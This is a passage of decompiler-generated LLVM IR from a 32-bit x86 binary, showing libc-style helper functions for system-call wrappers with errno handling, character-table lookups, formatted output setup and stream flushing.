  %v7_8050eba = icmp eq i32 %v1_8050eba, 0
  store i32 %v7_8050eb7, i32* %esi.global-to-local, align 4
  %v2_8050ec1 = or i1 %v2_8050eba, %v7_8050eba
  br i1 %v2_8050ec1, label %dec_label_pc_8050ed1, label %dec_label_pc_8050ec3

dec_label_pc_8050ec3:                             ; preds = %dec_label_pc_8050eaa
  %v1_8050ec3 = call i32 @function_8050f90(i32 %v0_8050eaf)
  %v0_8050ec8 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050ec8 = sub i32 0, %v0_8050ec8
  %v2_8050eca = inttoptr i32 %v1_8050ec3 to i32*
  store i32 %v1_8050ec8, i32* %v2_8050eca, align 4
  store i1 false, i1* @of, align 1
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050ed1

dec_label_pc_8050ed1:                             ; preds = %dec_label_pc_8050ec3, %dec_label_pc_8050eaa, %dec_label_pc_8050e9a
  %storemerge = phi i32 [ -1, %dec_label_pc_8050e9a ], [ %v7_8050eb7, %dec_label_pc_8050eaa ], [ -1, %dec_label_pc_8050ec3 ]
  %v2_8050ed1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050ed1, i32* @edx, align 4
  store i32 %v0_8050e81, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8050eba, { 1, 0 }
  uselistorder i32 %v7_8050eb7, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v0_8050eaf, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_8050ed8(i32* %arg1) local_unnamed_addr {
dec_label_pc_8050ed8:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8050ed8 = load i32, i32* @edi, align 4
  store i32 %v0_8050ed8, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_8050ee0 = load i32, i32* @ebx, align 4
  %v2_8050ee8 = call i32 @time(i32* %arg1)
  store i32 %v0_8050ee0, i32* @ebx, align 4
  store i32 %v2_8050ee8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8050ee8, -4095
  br i1 %tmp, label %dec_label_pc_8050f00, label %dec_label_pc_8050ef4

dec_label_pc_8050ef4:                             ; preds = %dec_label_pc_8050ed8
  %v1_8050ef4 = call i32 @function_8050f90(i32 %v0_8050ee0)
  %v0_8050ef9 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050ef9 = sub i32 0, %v0_8050ef9
  %v2_8050efb = inttoptr i32 %v1_8050ef4 to i32*
  store i32 %v1_8050ef9, i32* %v2_8050efb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050f00

dec_label_pc_8050f00:                             ; preds = %dec_label_pc_8050ed8, %dec_label_pc_8050ef4
  %v0_8050f01 = phi i32 [ %v2_8050ee8, %dec_label_pc_8050ed8 ], [ -1, %dec_label_pc_8050ef4 ]
  %v2_8050f04 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050f04, i32* @edi, align 4
  ret i32 %v0_8050f01

; uselistorder directives
  uselistorder i32 %v2_8050ee8, { 1, 0, 2 }
  uselistorder i32 %v0_8050ee0, { 1, 0 }
  uselistorder label %dec_label_pc_8050f00, { 1, 0 }
}

define i32 @function_8050f08(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050f08:
  %v5_8050f19 = call i32 @function_80545cc(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* null)
  ret i32 %v5_8050f19
}

define i32 @function_8050f24(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050f24:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050f24 = load i32, i32* @edi, align 4
  store i32 %v0_8050f24, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050f34 = load i32, i32* @ebx, align 4
  %v4_8050f3c = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8050f34, i32* @ebx, align 4
  store i32 %v4_8050f3c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8050f3c, -4095
  br i1 %tmp, label %dec_label_pc_8050f54, label %dec_label_pc_8050f48

dec_label_pc_8050f48:                             ; preds = %dec_label_pc_8050f24
  %v1_8050f48 = call i32 @function_8050f90(i32 %v0_8050f34)
  %v0_8050f4d = load i32, i32* %edi.global-to-local, align 4
  %v1_8050f4d = sub i32 0, %v0_8050f4d
  %v2_8050f4f = inttoptr i32 %v1_8050f48 to i32*
  store i32 %v1_8050f4d, i32* %v2_8050f4f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050f54

dec_label_pc_8050f54:                             ; preds = %dec_label_pc_8050f24, %dec_label_pc_8050f48
  %v0_8050f55 = phi i32 [ %v4_8050f3c, %dec_label_pc_8050f24 ], [ -1, %dec_label_pc_8050f48 ]
  %v2_8050f54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050f54, i32* @edx, align 4
  %v2_8050f58 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050f58, i32* @edi, align 4
  ret i32 %v0_8050f55

; uselistorder directives
  uselistorder i32 %v4_8050f3c, { 1, 0, 2 }
  uselistorder i32 %v0_8050f34, { 1, 0 }
  uselistorder label %dec_label_pc_8050f54, { 1, 0 }
}

define i32 @function_8050f5c(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050f5c:
  %v0_8050f60 = load i32, i32* inttoptr (i32 134604316 to i32*), align 4
  %v2_8050f65 = mul i32 %arg1, 2
  %v3_8050f65 = add i32 %v0_8050f60, %v2_8050f65
  %v4_8050f65 = inttoptr i32 %v3_8050f65 to i16*
  %v5_8050f65 = load i16, i16* %v4_8050f65, align 2
  %v6_8050f65 = zext i16 %v5_8050f65 to i32
  %v1_8050f69 = and i32 %v6_8050f65, 32
  ret i32 %v1_8050f69
}

define i32 @function_8050f70(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050f70:
  store i32 %arg1, i32* @edx, align 4
  %v1_8050f74 = add i32 %arg1, 128
  %v6_8050f7f = icmp ugt i32 %v1_8050f74, 383
  br i1 %v6_8050f7f, label %dec_label_pc_8050f8a, label %dec_label_pc_8050f81

dec_label_pc_8050f81:                             ; preds = %dec_label_pc_8050f70
  %v0_8050f81 = load i32, i32* inttoptr (i32 134604324 to i32*), align 4
  %v2_8050f86 = mul i32 %arg1, 2
  %v3_8050f86 = add i32 %v0_8050f81, %v2_8050f86
  %v4_8050f86 = inttoptr i32 %v3_8050f86 to i16*
  %v5_8050f86 = load i16, i16* %v4_8050f86, align 2
  %v6_8050f86 = sext i16 %v5_8050f86 to i32
  store i32 %v6_8050f86, i32* @edx, align 4
  br label %dec_label_pc_8050f8a

dec_label_pc_8050f8a:                             ; preds = %dec_label_pc_8050f70, %dec_label_pc_8050f81
  %v0_8050f8a = phi i32 [ %arg1, %dec_label_pc_8050f70 ], [ %v6_8050f86, %dec_label_pc_8050f81 ]
  ret i32 %v0_8050f8a

; uselistorder directives
  uselistorder label %dec_label_pc_8050f8a, { 1, 0 }
}

define i32 @function_8050f90(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050f90:
  ret i32 ptrtoint (i32* @global_var_8064b20.305 to i32)
}

define i32 @function_8050f98(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050f98:
  %stack_var_12 = alloca i32, align 4
  %v2_8050f9b = ptrtoint i32* %stack_var_12 to i32
  %v4_8050fae = inttoptr i32 %arg1 to i8*
  %v5_8050fae = call i32 @function_8050fb8(i8* %v4_8050fae, i32 -1, i32 %arg2, i32 %v2_8050f9b)
  ret i32 %v5_8050fae
}

define i32 @function_8050fb8(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050fb8:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050fb8 = load i32, i32* @ebp, align 4
  %v0_8050fb9 = load i32, i32* @edi, align 4
  %v0_8050fba = load i32, i32* @esi, align 4
  %v0_8050fbb = load i32, i32* @ebx, align 4
  store i32 %v0_8050fbb, i32* %stack_var_-16, align 4
  %v4_8050fbf = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050fbf, i32* @esi, align 4
  %v2_8050fc3 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_8050fce = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_8050fce, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_8050fe8 = sub i32 -1, %v4_8050fbf
  %v1_8050ffb = call i32 @function_80510cb(i32 %v2_8050fc3)
  %v1_805100b = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_8050fe8, %v1_805100b
  %v5_805100d = select i1 %tmp, i32 %v1_8050fe8, i32 %v1_805100b
  store i32 %v5_805100d, i32* @ebx, align 4
  %v0_8051010 = load i32, i32* @esi, align 4
  %v3_805103a = inttoptr i32 %arg3 to i8*
  %v4_805103a = call i32 @function_8051238(i32 %v2_8050fce, i8* %v3_805103a, i32 %arg4)
  %v1_8051042 = icmp eq i32 %v5_805100d, 0
  store i32 %v4_805103a, i32* %edx.global-to-local, align 4
  br i1 %v1_8051042, label %dec_label_pc_805105e, label %dec_label_pc_8051057

dec_label_pc_8051057:                             ; preds = %dec_label_pc_8050fb8
  %stack_var_-80.0 = inttoptr i32 %v0_8051010 to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_8051061.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805105e

dec_label_pc_805105e:                             ; preds = %dec_label_pc_8050fb8, %dec_label_pc_8051057
  %v0_8051061 = phi i32 [ %v4_805103a, %dec_label_pc_8050fb8 ], [ %v0_8051061.pre, %dec_label_pc_8051057 ]
  %v2_8051063 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051063, i32* @ebx, align 4
  store i32 %v0_8050fba, i32* @esi, align 4
  store i32 %v0_8050fb9, i32* @edi, align 4
  store i32 %v0_8050fb8, i32* @ebp, align 4
  ret i32 %v0_8051061

; uselistorder directives
  uselistorder i32 %v1_805100b, { 1, 0 }
  uselistorder i32 %v1_8050fe8, { 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_805105e, { 1, 0 }
}

define i32 @function_8051068() local_unnamed_addr {
dec_label_pc_8051068:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051069 = load i32, i32* @edi, align 4
  %v0_805106a = load i32, i32* @esi, align 4
  %v0_805106b = load i32, i32* @ebx, align 4
  store i32 %v0_805106b, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_8051074 = call i32 @function_8050f90(i32 %v0_805106b)
  %v0_805107c = load i16, i16* @global_var_805e680.302, align 128
  %v1_805107c = zext i16 %v0_805107c to i32
  store i32 %v1_805107c, i32* @esi, align 4
  %v1_8051083 = inttoptr i32 %v1_8051074 to i32*
  %v2_8051083 = load i32, i32* %v1_8051083, align 4
  store i32 %v2_8051083, i32* %ebp.global-to-local, align 4
  store i32 %v1_8051074, i32* @edi, align 4
  %v1_8051089 = call i32 @function_8052180(i32 0)
  %v0_805108e = load i32, i32* @ebx, align 4
  %v2_8051097 = sub i32 %v0_805108e, %v1_8051089
  %v2_805109b = mul i32 %v2_8051097, 256
  %v0_805109e = load i32, i32* @esi, align 4
  %v2_805109e = xor i32 %v0_805109e, %v2_805109b
  %v1_80510a0 = trunc i32 %v2_805109e to i16
  store i16 %v1_80510a0, i16* @global_var_805e680.302, align 128
  %v0_80510a7 = load i16, i16* @global_var_805e6d0.303, align 16
  %v1_80510a7 = zext i16 %v0_80510a7 to i32
  store i32 %v1_80510a7, i32* @esi, align 4
  %v1_80510ae = call i32 @function_8052180(i32 1)
  %v0_80510b3 = load i32, i32* @ebx, align 4
  %v2_80510b3 = sub i32 %v0_80510b3, %v1_80510ae
  %v2_80510b5 = mul i32 %v2_80510b3, 256
  %v0_80510b8 = load i32, i32* @esi, align 4
  %v2_80510b8 = xor i32 %v2_80510b5, %v0_80510b8
  %v1_80510ba = trunc i32 %v2_80510b8 to i16
  store i16 %v1_80510ba, i16* @global_var_805e6d0.303, align 16
  %v0_80510c1 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80510c1 = load i32, i32* @edi, align 4
  %v2_80510c1 = inttoptr i32 %v1_80510c1 to i32*
  store i32 %v0_80510c1, i32* %v2_80510c1, align 4
  %v2_80510c6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80510c6, i32* @ebx, align 4
  store i32 %v0_805106a, i32* @esi, align 4
  store i32 %v0_8051069, i32* @edi, align 4
  ret i32 %v1_80510ae

; uselistorder directives
  uselistorder i32 %v1_8051074, { 1, 0 }
  uselistorder i16* @global_var_805e6d0.303, { 1, 0 }
}

define i32 @function_80510cb(i32 %arg1) local_unnamed_addr {
dec_label_pc_80510cb:
  %v3_80510d9 = inttoptr i32 %arg1 to i16*
  %v4_80510d9 = call i32 @function_8051e5c(i16* %v3_80510d9, i32 ptrtoint (i32* @global_var_805c080.306 to i32), i32 24)
  ret i32 %v4_80510d9
}

define i32 @function_80510e2() local_unnamed_addr {
dec_label_pc_80510e2:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80510e2 = load i32, i32* @esi, align 4
  %v0_80510e3 = load i32, i32* @ebx, align 4
  store i32 %v0_80510e3, i32* %stack_var_-8, align 4
  %v1_80510ec = call i32 @function_80510cb(i32 ptrtoint (i32* @global_var_805e640.307 to i32))
  store i32 %v1_80510ec, i32* %eax.global-to-local, align 4
  %v1_80510f8 = call i32 @function_80510cb(i32 ptrtoint (i32* @global_var_805e658.308 to i32))
  store i32 %v1_80510f8, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805e63c.309 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_805114222 = icmp eq i32 %storemerge21, 0
  %v1_805114424 = icmp eq i1 %v1_805114222, false
  br i1 %v1_805114424, label %dec_label_pc_8051105.lr.ph, label %dec_label_pc_8051162.preheader

dec_label_pc_8051105.lr.ph:                       ; preds = %dec_label_pc_80510e2
  br label %dec_label_pc_8051105

dec_label_pc_8051105:                             ; preds = %dec_label_pc_8051105.lr.ph, %dec_label_pc_805112c
  %storemerge25 = phi i32 [ %storemerge21, %dec_label_pc_8051105.lr.ph ], [ %storemerge, %dec_label_pc_805112c ]
  %v1_8051108 = add i32 %storemerge25, 56
  store i32 %v1_8051108, i32* @esi, align 4
  %v1_805110c = call i32 @function_8054057(i32 %v1_8051108)
  store i32 %v1_805110c, i32* %eax.global-to-local, align 4
  %v1_8051114 = icmp eq i32 %v1_805110c, 0
  br i1 %v1_8051114, label %dec_label_pc_805112c, label %dec_label_pc_8051118

dec_label_pc_8051118:                             ; preds = %dec_label_pc_8051105
  %v0_8051118 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051118 = add i32 %v0_8051118, 8
  %v2_8051118 = inttoptr i32 %v1_8051118 to i32*
  %v3_8051118 = load i32, i32* %v2_8051118, align 4
  store i32 %v3_8051118, i32* %eax.global-to-local, align 4
  %v1_805111b = inttoptr i32 %v0_8051118 to i16*
  store i16 48, i16* %v1_805111b, align 2
  %v0_8051120 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051120 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051120 = add i32 %v1_8051120, 24
  %v3_8051120 = inttoptr i32 %v2_8051120 to i32*
  store i32 %v0_8051120, i32* %v3_8051120, align 4
  %v0_8051123 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051123 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051123 = add i32 %v1_8051123, 28
  %v3_8051123 = inttoptr i32 %v2_8051123 to i32*
  store i32 %v0_8051123, i32* %v3_8051123, align 4
  %v0_8051126 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051126 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051126 = add i32 %v1_8051126, 16
  %v3_8051126 = inttoptr i32 %v2_8051126 to i32*
  store i32 %v0_8051126, i32* %v3_8051126, align 4
  %v0_8051129 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051129 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051129 = add i32 %v1_8051129, 20
  %v3_8051129 = inttoptr i32 %v2_8051129 to i32*
  store i32 %v0_8051129, i32* %v3_8051129, align 4
  br label %dec_label_pc_805112c

dec_label_pc_805112c:                             ; preds = %dec_label_pc_8051105, %dec_label_pc_8051118
  %v0_805112f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805112f = add i32 %v0_805112f, 52
  %v2_805112f = inttoptr i32 %v1_805112f to i32*
  store i32 1, i32* %v2_805112f, align 4
  %v0_8051136 = load i32, i32* @esi, align 4
  %v1_8051137 = call i32 @function_80510cb(i32 %v0_8051136)
  store i32 %v1_8051137, i32* %eax.global-to-local, align 4
  %v0_805113c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805113c = add i32 %v0_805113c, 32
  %v2_805113c = inttoptr i32 %v1_805113c to i32*
  %storemerge = load i32, i32* %v2_805113c, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_8051142 = icmp eq i32 %storemerge, 0
  %v1_8051144 = icmp eq i1 %v1_8051142, false
  br i1 %v1_8051144, label %dec_label_pc_8051105, label %dec_label_pc_805113f.dec_label_pc_8051162.preheader_crit_edge

dec_label_pc_805113f.dec_label_pc_8051162.preheader_crit_edge: ; preds = %dec_label_pc_805112c
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805e63c.309 to i32*), align 4
  br label %dec_label_pc_8051162.preheader

dec_label_pc_8051162.preheader:                   ; preds = %dec_label_pc_805113f.dec_label_pc_8051162.preheader_crit_edge, %dec_label_pc_80510e2
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_805113f.dec_label_pc_8051162.preheader_crit_edge ], [ %storemerge21, %dec_label_pc_80510e2 ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_80511623 = icmp eq i32 %storemerge12, 0
  %v1_805116410 = icmp eq i1 %v1_80511623, false
  br i1 %v1_805116410, label %dec_label_pc_805114e.preheader, label %dec_label_pc_8051166

dec_label_pc_805114e.preheader:                   ; preds = %dec_label_pc_8051162.preheader
  br label %dec_label_pc_805114e

dec_label_pc_805114e:                             ; preds = %dec_label_pc_805114e.preheader, %dec_label_pc_805115f
  %v0_8051156 = phi i32 [ %storemerge1, %dec_label_pc_805115f ], [ %storemerge12, %dec_label_pc_805114e.preheader ]
  %v1_805114e = inttoptr i32 %v0_8051156 to i8*
  %v2_805114e = load i8, i8* %v1_805114e, align 1
  %v3_805114e = and i8 %v2_805114e, 64
  %v4_805114e = icmp eq i8 %v3_805114e, 0
  br i1 %v4_805114e, label %dec_label_pc_805115f, label %dec_label_pc_8051153

dec_label_pc_8051153:                             ; preds = %dec_label_pc_805114e
  %v1_8051157 = call i32 @function_805116c(i32 %v0_8051156)
  store i32 %v1_8051157, i32* %eax.global-to-local, align 4
  %v0_805115f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805115f

dec_label_pc_805115f:                             ; preds = %dec_label_pc_805114e, %dec_label_pc_8051153
  %v0_805115f = phi i32 [ %v0_8051156, %dec_label_pc_805114e ], [ %v0_805115f.pre, %dec_label_pc_8051153 ]
  %v1_805115f = add i32 %v0_805115f, 32
  %v2_805115f = inttoptr i32 %v1_805115f to i32*
  %storemerge1 = load i32, i32* %v2_805115f, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_8051162 = icmp eq i32 %storemerge1, 0
  %v1_8051164 = icmp eq i1 %v1_8051162, false
  br i1 %v1_8051164, label %dec_label_pc_805114e, label %dec_label_pc_8051166

dec_label_pc_8051166:                             ; preds = %dec_label_pc_805115f, %dec_label_pc_8051162.preheader
  %v2_8051166 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051166, i32* %eax.global-to-local, align 4
  %v2_8051167 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051167, i32* @ebx, align 4
  store i32 %v0_80510e2, i32* @esi, align 4
  ret i32 %v2_8051166

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805115f, { 1, 0 }
  uselistorder label %dec_label_pc_805114e, { 1, 0 }
  uselistorder label %dec_label_pc_805112c, { 1, 0 }
  uselistorder label %dec_label_pc_8051105, { 1, 0 }
}

define i32 @function_805116c(i32 %arg1) local_unnamed_addr {
dec_label_pc_805116c:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_805116c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8051174 = add i32 %arg1, 8
  %v2_8051174 = inttoptr i32 %v1_8051174 to i32*
  %v3_8051174 = load i32, i32* %v2_8051174, align 4
  store i32 %v3_8051174, i32* %edx.global-to-local, align 4
  %v1_8051177 = add i32 %arg1, 16
  %v2_8051177 = inttoptr i32 %v1_8051177 to i32*
  %v3_8051177 = load i32, i32* %v2_8051177, align 4
  %v2_805117a = sub i32 %v3_8051177, %v3_8051174
  %v12_805117a = icmp eq i32 %v2_805117a, 0
  store i32 %v2_805117a, i32* %eax.global-to-local, align 4
  br i1 %v12_805117a, label %dec_label_pc_805118d, label %dec_label_pc_805117e

dec_label_pc_805117e:                             ; preds = %dec_label_pc_805116c
  store i32 %v3_8051174, i32* %v2_8051177, align 4
  %v0_8051181 = load i32, i32* @ecx, align 4
  %v0_8051182 = load i32, i32* %eax.global-to-local, align 4
  %v0_8051183 = load i32, i32* %edx.global-to-local, align 4
  %v0_8051184 = load i32, i32* @ebx, align 4
  %v4_8051185 = inttoptr i32 %v0_8051184 to i16*
  %v5_8051185 = call i32 @function_8054720(i16* %v4_8051185, i32 %v0_8051183, i32 %v0_8051182, i32 %v0_8051181)
  store i32 %v5_8051185, i32* %eax.global-to-local, align 4
  %v0_805118d.pre = load i32, i32* @ebx, align 4
  %v2_8051193.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805118d

dec_label_pc_805118d:                             ; preds = %dec_label_pc_805116c, %dec_label_pc_805117e
  %v2_8051193 = phi i32 [ %tmp11, %dec_label_pc_805116c ], [ %v2_8051193.pre, %dec_label_pc_805117e ]
  %v0_805118d = phi i32 [ %arg1, %dec_label_pc_805116c ], [ %v0_805118d.pre, %dec_label_pc_805117e ]
  %v1_805118d = add i32 %v0_805118d, 16
  %v2_805118d = inttoptr i32 %v1_805118d to i32*
  %v3_805118d = load i32, i32* %v2_805118d, align 4
  store i32 %v3_805118d, i32* %eax.global-to-local, align 4
  %v2_8051190 = add i32 %v0_805118d, 8
  %v3_8051190 = inttoptr i32 %v2_8051190 to i32*
  %v4_8051190 = load i32, i32* %v3_8051190, align 4
  %v5_8051190 = sub i32 %v3_805118d, %v4_8051190
  store i32 %v5_8051190, i32* %eax.global-to-local, align 4
  store i32 %v2_8051193, i32* @edx, align 4
  store i32 %v0_805116c, i32* @ebx, align 4
  ret i32 %v5_8051190

; uselistorder directives
  uselistorder i32 %v0_805118d, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805118d, { 1, 0 }
}

define i32 @function_8051198() local_unnamed_addr {
dec_label_pc_8051198:
  %stack_var_-13 = alloca i32, align 4
  %v0_8051198 = load i32, i32* @edi, align 4
  %v0_8051199 = load i32, i32* @eax, align 4
  store i32 %v0_8051199, i32* @edi, align 4
  %v0_805119b = load i32, i32* @esi, align 4
  %v0_805119c = load i32, i32* @ecx, align 4
  store i32 %v0_805119c, i32* @esi, align 4
  %v0_805119e = load i32, i32* @ebx, align 4
  store i32 %v0_805119c, i32* @ebx, align 4
  %v0_80511a4 = load i32, i32* @edx, align 4
  store i32 %v0_80511a4, i32* %stack_var_-13, align 4
  %v1_80511ab2 = icmp eq i32 %v0_805119c, 0
  br i1 %v1_80511ab2, label %dec_label_pc_80511c3, label %dec_label_pc_80511af.lr.ph

dec_label_pc_80511af.lr.ph:                       ; preds = %dec_label_pc_8051198
  %v2_80511af = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_80511af

dec_label_pc_80511aa:                             ; preds = %dec_label_pc_80511af
  %v1_80511aa = add i32 %v0_80511aa, -1
  %v8_80511aa = icmp eq i32 %v1_80511aa, 0
  store i32 %v1_80511aa, i32* @ebx, align 4
  br i1 %v8_80511aa, label %dec_label_pc_80511c3.loopexit, label %dec_label_pc_80511aa.dec_label_pc_80511af_crit_edge

dec_label_pc_80511aa.dec_label_pc_80511af_crit_edge: ; preds = %dec_label_pc_80511aa
  %v0_80511b3.pre = load i32, i32* @edx, align 4
  %v0_80511b4.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80511af

dec_label_pc_80511af:                             ; preds = %dec_label_pc_80511aa.dec_label_pc_80511af_crit_edge, %dec_label_pc_80511af.lr.ph
  %v0_80511b4 = phi i32 [ %v0_80511b4.pre, %dec_label_pc_80511aa.dec_label_pc_80511af_crit_edge ], [ %v0_8051199, %dec_label_pc_80511af.lr.ph ]
  %v0_80511b3 = phi i32 [ %v0_80511b3.pre, %dec_label_pc_80511aa.dec_label_pc_80511af_crit_edge ], [ %v0_80511a4, %dec_label_pc_80511af.lr.ph ]
  %v4_80511b8 = call i32 @function_80547a0(i32 %v2_80511af, i32 1, i32 %v0_80511b4, i32 %v0_80511b3)
  %v8_80511c0 = icmp eq i32 %v4_80511b8, 1
  %v0_80511aa = load i32, i32* @ebx, align 4
  br i1 %v8_80511c0, label %dec_label_pc_80511aa, label %dec_label_pc_80511c3.loopexit

dec_label_pc_80511c3.loopexit:                    ; preds = %dec_label_pc_80511aa, %dec_label_pc_80511af
  %v1_80511c6.ph = phi i32 [ %v0_80511aa, %dec_label_pc_80511af ], [ 0, %dec_label_pc_80511aa ]
  %v0_80511c6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80511c3

dec_label_pc_80511c3:                             ; preds = %dec_label_pc_80511c3.loopexit, %dec_label_pc_8051198
  %v0_80511c6 = phi i32 [ 0, %dec_label_pc_8051198 ], [ %v0_80511c6.pre, %dec_label_pc_80511c3.loopexit ]
  %v1_80511c6 = phi i32 [ 0, %dec_label_pc_8051198 ], [ %v1_80511c6.ph, %dec_label_pc_80511c3.loopexit ]
  %v2_80511c6 = sub i32 %v0_80511c6, %v1_80511c6
  store i32 %v0_805119e, i32* @ebx, align 4
  store i32 %v0_805119b, i32* @esi, align 4
  store i32 %v0_8051198, i32* @edi, align 4
  ret i32 %v2_80511c6

; uselistorder directives
  uselistorder i32 %v1_80511aa, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_80511c3.loopexit, { 1, 0 }
}

define i32 @function_80511ce(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80511ce:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_80511e1 = trunc i32 %arg2 to i8
  %v5_80511e1 = icmp slt i8 %v3_80511e1, 0
  %v1_80511e3 = icmp eq i1 %v5_80511e1, false
  br i1 %v1_80511e3, label %dec_label_pc_8051214, label %dec_label_pc_80511e5

dec_label_pc_80511e5:                             ; preds = %dec_label_pc_80511ce
  %v1_80511ec = inttoptr i32 %arg4 to i8*
  %v2_80511ec = call i32 @function_8051ef8(i8* %v1_80511ec)
  %v0_80511f4 = load i32, i32* @ebx, align 4
  %v2_80511f4 = sub i32 %v0_80511f4, %v2_80511ec
  store i32 %v2_80511f4, i32* @ebx, align 4
  store i32 %v2_80511ec, i32* @esi, align 4
  %tmp18 = icmp slt i32 %v2_80511f4, 1
  br i1 %tmp18, label %dec_label_pc_8051212, label %dec_label_pc_80511fc

dec_label_pc_80511fc:                             ; preds = %dec_label_pc_80511e5
  store i32 %arg1, i32* @eax, align 4
  %v0_8051200 = load i32, i32* @edi, align 4
  %v1_8051200 = urem i32 %v0_8051200, 128
  store i32 %v1_8051200, i32* @edi, align 4
  store i32 %v2_80511f4, i32* @ecx, align 4
  store i32 %v1_8051200, i32* @edx, align 4
  %v0_8051207 = call i32 @function_8051198()
  %v12_805120c = icmp eq i32 %v0_8051207, %v2_80511f4
  store i32 %v0_8051207, i32* @ebp, align 4
  %v1_8051210 = icmp eq i1 %v12_805120c, false
  br i1 %v1_8051210, label %dec_label_pc_805122e, label %dec_label_pc_80511fc.dec_label_pc_8051212_crit_edge

dec_label_pc_80511fc.dec_label_pc_8051212_crit_edge: ; preds = %dec_label_pc_80511fc
  %v0_8051212.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051212

